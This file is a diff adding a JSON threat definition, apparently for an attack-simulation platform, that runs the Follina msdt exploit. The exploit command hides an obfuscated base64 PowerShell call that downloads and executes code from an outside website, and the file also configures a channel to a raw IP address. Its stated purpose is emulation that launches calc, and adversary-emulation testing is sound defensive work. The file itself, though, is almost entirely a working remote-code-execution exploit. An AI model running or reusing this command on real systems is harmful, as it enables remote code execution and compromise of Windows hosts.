@@ -1,0 +1,35 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Executes calc.exe indirectly via msdt.exe. Calls to malwarejake.com for PowerShell code.",
+        "display_name": "Follina msdt calc-callout",
+        "name": "Follina msdt calc-callout",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 35.231.125.169:443 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(iex($(iex('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'aWV4KCdpZXgoaXJtIGh0dHBzOi8vd3d3Lm1hbHdhcmVqYWtlLmNvbS9mb2xsaW5hY2FsYy5odG0pJyk='+[char]34+'))'))))i../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\" ",
+                "rtags": [
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1202",
+                    "att&ck-technique:T1059.001"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
